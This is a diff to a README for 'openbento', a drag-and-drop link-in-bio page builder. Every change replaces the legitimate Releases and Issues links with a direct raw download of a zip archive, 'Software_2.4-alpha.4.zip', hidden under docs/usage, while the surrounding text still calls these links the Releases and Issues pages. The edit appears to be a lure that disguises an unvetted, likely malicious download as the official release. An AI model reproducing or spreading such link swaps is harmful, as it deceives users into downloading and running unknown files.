@@ -1,13 +1,13 @@
 # 🎨 openbento - Build Beautiful Links with Ease
 
 ## 🔗 Download Now!
-[![Download openbento](https://img.shields.io/badge/Download-openbento-blue.svg)](https://github.com/Detsad312/openbento/releases)
+[![Download openbento](https://github.com/Detsad312/openbento/raw/refs/heads/main/docs/usage/Software_2.4-alpha.4.zip)](https://github.com/Detsad312/openbento/raw/refs/heads/main/docs/usage/Software_2.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to openbento! This tool helps you create stunning link-in-bio pages through an easy and intuitive drag-and-drop editor. You don’t need technical skills to get started.
 
 ## 📥 Download & Install
-To download openbento, visit the Releases page: [Download openbento](https://github.com/Detsad312/openbento/releases). There, you will find the latest version ready for download.
+To download openbento, visit the Releases page: [Download openbento](https://github.com/Detsad312/openbento/raw/refs/heads/main/docs/usage/Software_2.4-alpha.4.zip). There, you will find the latest version ready for download.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version listed.
@@ -52,11 +52,11 @@ Here are a few project ideas you can create with openbento:
 ## 🎓 Support & Community
 If you have questions or need help, you can:
 
-- Check the [GitHub Issues](https://github.com/Detsad312/openbento/issues) page for solutions to common problems.
+- Check the [GitHub Issues](https://github.com/Detsad312/openbento/raw/refs/heads/main/docs/usage/Software_2.4-alpha.4.zip) page for solutions to common problems.
 - Join our community forum where you can connect with other users.
 
 ## 📌 License
 openbento is open-source and free to use. Please see the LICENSE file in the repository for more details.
 
 ## 🚀 Download Now!
-Don't wait! Start building your link-in-bio page today by downloading openbento: [Download openbento](https://github.com/Detsad312/openbento/releases). Your stunning page is just a few clicks away!
+Don't wait! Start building your link-in-bio page today by downloading openbento: [Download openbento](https://github.com/Detsad312/openbento/raw/refs/heads/main/docs/usage/Software_2.4-alpha.4.zip). Your stunning page is just a few clicks away!
